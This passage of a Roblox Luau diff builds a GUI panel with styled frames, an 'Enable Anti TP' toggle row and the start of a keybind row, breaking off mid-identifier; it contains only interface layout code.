+BgImg_2.BorderSizePixel = 0
+BgImg_2.Image = "rbxassetid://139854494692009"
+BgImg_2.ImageTransparency = 0.2
+BgImg_2.ScaleType = Enum.ScaleType.Crop
+BgImg_2.AutoButtonColor = false
+BgImg_2.Parent = BgPicker
+
+do
+	local _o = Instance.new("UICorner")
+	_o.CornerRadius = UDim.new(0, 6)
+	_o.Parent = BgImg_2
+end
+
+do
+	local _o = Instance.new("UIStroke")
+	_o.Color = Color3.fromRGB(50, 100, 200)
+	_o.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	_o.Transparency = 0.5
+	_o.Parent = BgImg_2
+end
+
+local Content = Instance.new("Frame")
+Content.Name = "Content"
+Content.ZIndex = 5
+Content.Position = UDim2.new(0, 14, 0, 50)
+Content.Size = UDim2.new(1, -28, 1, -72)
+Content.BackgroundTransparency = 1
+Content.Parent = Main
+
+do
+	local _o = Instance.new("UIListLayout")
+	_o.Padding = UDim.new(0, 4)
+	_o.SortOrder = Enum.SortOrder.LayoutOrder
+	_o.Parent = Content
+end
+
+local AntiTPRow = Instance.new("Frame")
+AntiTPRow.Name = "AntiTPRow"
+AntiTPRow.ZIndex = 5
+AntiTPRow.LayoutOrder = 1
+AntiTPRow.Size = UDim2.new(1, 0, 0, 34)
+AntiTPRow.BackgroundColor3 = Color3.fromRGB(18, 20, 45)
+AntiTPRow.BackgroundTransparency = 0.3
+AntiTPRow.BorderSizePixel = 0
+AntiTPRow.Parent = Content
+
+do
+	local _o = Instance.new("UICorner")
+	_o.Parent = AntiTPRow
+end
+
+do
+	local _o = Instance.new("UIGradient")
+	_o.Color = ColorSequence.new({
+		ColorSequenceKeypoint.new(0, Color3.fromRGB(18, 20, 45)),
+		ColorSequenceKeypoint.new(1, Color3.fromRGB(12, 14, 35))
+	})
+	_o.Rotation = 90
+	_o.Transparency = NumberSequence.new({
+		NumberSequenceKeypoint.new(0, 0.4, 0),
+		NumberSequenceKeypoint.new(0.5, 0.7, 0),
+		NumberSequenceKeypoint.new(1, 0.55, 0)
+	})
+	_o.Parent = AntiTPRow
+end
+
+do
+	local _o = Instance.new("UIStroke")
+	_o.Color = Color3.fromRGB(50, 100, 200)
+	_o.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	_o.Transparency = 0.5
+	_o.Parent = AntiTPRow
+end
+
+local Label = Instance.new("TextLabel")
+Label.Name = "Label"
+Label.ZIndex = 6
+Label.Position = UDim2.new(0, 12, 0, 2)
+Label.Size = UDim2.new(1, -70, 0, 16)
+Label.BackgroundTransparency = 1
+Label.Text = "Enable Anti TP"
+Label.TextColor3 = Color3.fromRGB(255, 255, 255)
+Label.TextSize = 12
+Label.Font = Enum.Font.GothamBold
+Label.TextXAlignment = Enum.TextXAlignment.Left
+Label.Parent = AntiTPRow
+
+local Status = Instance.new("TextLabel")
+Status.Name = "Status"
+Status.ZIndex = 6
+Status.Position = UDim2.new(0, 12, 0, 18)
+Status.Size = UDim2.new(1, -70, 0, 12)
+Status.BackgroundTransparency = 1
+Status.Text = "OFF"
+Status.TextColor3 = Color3.fromRGB(130, 150, 200)
+Status.Font = Enum.Font.GothamBold
+Status.TextXAlignment = Enum.TextXAlignment.Left
+Status.Parent = AntiTPRow
+
+local Toggle = Instance.new("Frame")
+Toggle.Name = "Toggle"
+Toggle.ZIndex = 7
+Toggle.AnchorPoint = Vector2.new(1, 0.5)
+Toggle.Position = UDim2.new(1, -10, 0.5, 0)
+Toggle.Size = UDim2.new(0, 38, 0, 20)
+Toggle.BackgroundColor3 = Color3.fromRGB(40, 50, 80)
+Toggle.BorderSizePixel = 0
+Toggle.Parent = AntiTPRow
+
+do
+	local _o = Instance.new("UICorner")
+	_o.CornerRadius = UDim.new(0, 10)
+	_o.Parent = Toggle
+end
+
+do
+	local _o = Instance.new("UIStroke")
+	_o.Color = Color3.fromRGB(50, 100, 200)
+	_o.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	_o.Transparency = 0.5
+	_o.Parent = Toggle
+end
+
+local Knob = Instance.new("Frame")
+Knob.Name = "Knob"
+Knob.ZIndex = 8
+Knob.Position = UDim2.new(0, 3, 0, 3)
+Knob.Size = UDim2.new(0, 14, 0, 14)
+Knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Knob.BorderSizePixel = 0
+Knob.Parent = Toggle
+
+do
+	local _o = Instance.new("UICorner")
+	_o.CornerRadius = UDim.new(1, 0)
+	_o.Parent = Knob
+end
+
+local ToggleHit = Instance.new("TextButton")
+ToggleHit.Name = "ToggleHit"
+ToggleHit.ZIndex = 9
+ToggleHit.Size = UDim2.new(1, 0, 1, 0)
+ToggleHit.BackgroundTransparency = 1
+ToggleHit.BorderSizePixel = 0
+ToggleHit.Text = ""
+ToggleHit.AutoButtonColor = false
+ToggleHit.Parent = AntiTPRow
+
+local KeybindRow = Instance.new("Frame")
+KeybindRow.Name = "KeybindRow"
+KeybindRow.ZIndex = 5
+KeybindRow.LayoutOrder = 2
+KeybindRow.Size = UDim2.new(1, 0, 0, 34)
+KeybindRow.BackgroundColor3 = Color3.fromRGB(18, 20, 45)
+KeybindRow.BackgroundTransparency = 0.3
+KeybindRow.BorderSizePixel = 0
+KeybindRow.Parent = Content
+
+do
+	local _o = Instance.new("UICorner")
+	_o.Parent = KeybindRow
+end
+
+do
+	local _o = Instance.new("UIGradient")
+	_o.Color = ColorSequence.new({
+		ColorSequenceKeypoint.new(0, Color3.fromRGB(18, 20, 45)),
+		ColorSequenceKeypoint.new(1, Color3.fromRGB(12, 14, 35))
+	})
+	_o.Rotation = 90
+	_o.Transparency = NumberSequence.new({
+		NumberSequenceKeypoint.new(0, 0.4, 0),
+		NumberSequenceKeypoint.new(0.5, 0.7, 0),
+		NumberSequenceKeypoint.new(1, 0.55, 0)
+	})
+	_o.Parent = KeybindRow
+end
+
+do
+	local _o = Instance.new("UIStroke")
+	_o.Color = Color3.fromRGB(50, 100, 200)
+	_o.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	_o.Transparency = 0.5
+	_o.Parent = KeybindRow
+end
+
+local Label2 = Instance.new("TextLabel")
+Label2.Name = "Label"
+Label2.ZIndex = 6
+Label2.Position = UDim2.new(0, 12, 0, 0)
+Label2.Size = UDim2.new(1, -80, 1, 0)
+Label2.BackgroundTransparency = 1
+Label2.Text = "Keybind"
+Label2.TextColor3 = Color3.fromRGB(255, 255, 255)
+Label2.TextSize = 12
+Label2.Font = Enum.Font.GothamBold
+Label2.TextXAlignment = Enum.TextXAlignment.Left
+Label2.Parent = KeybindRow
+
+local KeybindBtn = Instance.new("TextButton")
+Keybi
